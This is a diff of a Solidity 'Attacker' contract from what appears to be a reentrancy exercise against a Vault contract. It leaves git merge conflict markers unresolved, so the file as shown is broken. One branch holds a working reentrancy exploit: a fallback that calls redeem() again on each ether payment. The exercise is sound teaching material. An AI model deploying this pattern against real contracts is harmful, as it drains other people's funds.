@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.20;
 
+<<<<<<< HEAD
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 import "./Vault.sol";
@@ -18,6 +19,12 @@ contract Attacker is Ownable {
     error WithdrawFailure();
 
     event ValueStored(uint amount);
+=======
+import "./Vault.sol";
+
+contract Attacker {
+
+>>>>>>> dc24363 (rentrancy exercice)
     event RedeemCall(uint callCount);
     event FallbackCall(uint callCount, uint value);
   
@@ -25,6 +32,7 @@ contract Attacker is Ownable {
     uint redeemCallCount;
     uint fallbackCallCount;
  
+<<<<<<< HEAD
     /**
      * @notice Init deployed Vault contract based on the contract address
      */
@@ -54,10 +62,30 @@ contract Attacker is Ownable {
     /**
      * @notice start the real attack with a first redeem call
      */
+=======
+
+    constructor(address _contractAddr) {
+        // 1) Init deployed Vault contract from contract address
+        vault = Vault(_contractAddr);
+    }
+
+    fallback() external payable {
+        emit FallbackCall(++fallbackCallCount, msg.value);
+        this.redeem();
+    }
+ 
+    // 2) Store a little to be able to do a reddem
+    function store() external payable {
+        vault.store{value: msg.value}();
+    }
+      
+    // 3) start the real attack with a first redeem call
+>>>>>>> dc24363 (rentrancy exercice)
     function redeem() external {
         emit RedeemCall(++redeemCallCount);
         vault.redeem();
     }
+<<<<<<< HEAD
     
     function getSenderBalance() external view onlyOwner returns (uint) {
         return address(msg.sender).balance;
@@ -80,4 +108,6 @@ contract Attacker is Ownable {
             revert WithdrawFailure();
         }
     }
+=======
+>>>>>>> dc24363 (rentrancy exercice)
 }
